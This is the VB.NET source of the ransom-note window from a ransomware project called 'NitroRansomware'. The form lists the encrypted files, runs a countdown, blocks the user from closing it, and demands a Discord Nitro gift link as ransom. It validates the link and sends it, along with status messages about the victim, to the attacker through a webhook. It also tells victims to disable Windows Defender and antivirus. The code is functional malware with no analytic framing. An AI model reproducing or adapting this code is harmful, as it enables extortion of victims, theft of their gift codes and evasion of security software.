Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Data
Imports System.Drawing
Imports System.Linq
Imports System.Text
Imports System.Threading.Tasks
Imports System.Windows.Forms
Imports System.Threading

Namespace NitroRansomware
	Partial Public Class Form1
		Inherits Form

		Private t As System.Timers.Timer
		Private h As Integer = 3, m As Integer = 0, s As Integer = 0
		Private ww As New Webhook(Program.WEBHOOK)
		Public Sub New()
			InitializeComponent()
		End Sub

		Private Sub Form1_Load(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Load
			t = New System.Timers.Timer()
			t.Interval = 1000
			AddHandler t.Elapsed, AddressOf OnTimeEvent
			t.Start()

			textBox5.Text = ""

			For Each x As String In Crypto.encryptedFileLog
				textBox5.Text &= "Encrypted: " & x & ControlChars.CrLf
			Next x
		End Sub
		Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs)
			e.Cancel = e.CloseReason = CloseReason.UserClosing
		End Sub
		Private Sub button1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles button1.Click
			If NitroValid() Then
				textBox3.Text = Crypto.fPassword
				label7.Text = "Paste your key here." 'guessing pass
				label7.ForeColor = Color.LightGreen
				textBox4.Text = "" ' text box send nitro to get decrypt key
				label1.Text = "" ' change title to empty str
				panel3.BackColor = Color.FromArgb(35, 39, 42)
				textBox1.Text = "How to Decrypt files:" & ControlChars.CrLf & " Enter decryption key and click on Decrypt button. " & ControlChars.Lf & " Make sure Windows Defender and any other antivirus is off." & ControlChars.CrLf & " Do not close the application while decrypting or else files may get corrupted." 'instructions
				t.Stop()
			End If
		End Sub

		Private Sub button2_Click(ByVal sender As Object, ByVal e As EventArgs) Handles button2.Click

			Dim inputPassword As String = textBox4.Text
			If inputPassword = Crypto.fPassword Then
				ww.Send("```User has entered correct decryption key.. Decrypting files.```")
				MessageBox.Show("Key is correct. Decrypting files...", "Nitro Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Information)
				Crypto.inPassword = Crypto.fPassword
				textBox5.Text = "Decrypting files.. " & ControlChars.CrLf & "This may take a while. Loading.."
				Cursor.Current = Cursors.WaitCursor
				Program.DecryptAll()
				Cursor.Current = Cursors.Default
				MessageBox.Show("Task complete. If there are files that have not been decrypted, make sure you turn off all antivirus and Windows Defender, then try decrypting again. " & ControlChars.CrLf & "If it doesn't work, delete all Desktop.ini.givemenitro files that you see and try again.", "Nitro Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Information)
				'Program.RemoveStart();
			Else
				MessageBox.Show("Invalid key", "Nitro Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Error)
			End If
		End Sub
		Private Function NitroValid() As Boolean
			Dim ww As New Webhook(Program.WEBHOOK)
			Dim input As String = textBox2.Text
			Dim code As String = String.Empty
			Console.WriteLine(input)

			If input.Contains("discord.gift/") Then
				If input.Contains("https://") Then
					Dim found As Integer = input.IndexOf("/")
					code = input.Substring(found + 15)
					Console.WriteLine(code)
				Else
					Dim found As Integer = input.IndexOf("/")
					code = input.Substring(found + 1)
					MessageBox.Show("Checking gift validity.. .", "Nitro Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Information)
				End If
				If Nitro.Check(code) Then
					ww.Send("**Valid nitro code was received**")
					ww.Send(input)
					MessageBox.Show("Success! Valid nitro code was sent. Your decryption key is now available. You may start decrypting your files now.", "Nitro Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Information)
					Return True

				Else
					ww.Send("```User sent invalid discord gift Link.```")
					MessageBox.Show("Invalid Nitro", "Nitro Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Error)
				End If

			Else
				ww.Send("```User sent invalid discord gift Link.```")
				MessageBox.Show("Please enter a Discord nitro gift in this format discord.gift/code here", "Nitro Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Error)
			End If
			Return False
		End Function
		Private Sub OnTimeEvent(ByVal sender As Object, ByVal e As System.Timers.ElapsedEventArgs)
			Invoke(New Action(Sub()
				If s < 1 Then
					s = 59
					If m = 0 Then
						m = 59
						If h <> 0 Then
							h -= 1
						End If
					Else
						m -= 1
					End If
				Else
					s -= 1
				End If
				If s = 0 AndAlso m = 0 AndAlso h = 0 Then
				End If
				label10.Text = String.Format("{0}:{1}:{2}", h.ToString().PadLeft(2, "0"c), m.ToString().PadLeft(2, "0"c), s.ToString().PadLeft(2, "0"c))
			End Sub))
		End Sub

	End Class
End Namespace

